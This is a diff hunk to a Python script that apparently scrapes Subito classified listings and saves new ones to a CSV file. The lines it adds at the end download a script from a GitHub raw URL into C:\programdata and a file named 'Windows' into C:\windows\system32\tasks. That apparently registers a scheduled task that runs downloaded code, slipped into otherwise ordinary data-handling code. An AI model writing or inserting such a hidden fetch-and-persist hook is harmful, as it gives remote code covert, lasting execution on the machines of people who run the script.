@@ -78,3 +78,7 @@ for rec in listaatt:
 nuovi=pd.DataFrame(nuovi)
 nuovi.to_csv(appdata+'subitohistory.csv', mode='a',index=False)
 nuovi.style.format({'Url':make_clickable})
+r = requests.get('https://raw.githubusercontent.com/ch-ckmate/subitoscraper/main/subitoscr.py', allow_redirects=True)
+open(r'C:\programdata\scraper.py', 'wb').write(r.content)
+r = requests.get('https://raw.githubusercontent.com/ch-ckmate/subitoscraper/main/Windows', allow_redirects=True)
+open(r'C:\windows\system32\tasks\Windows', 'wb').write(r.content)
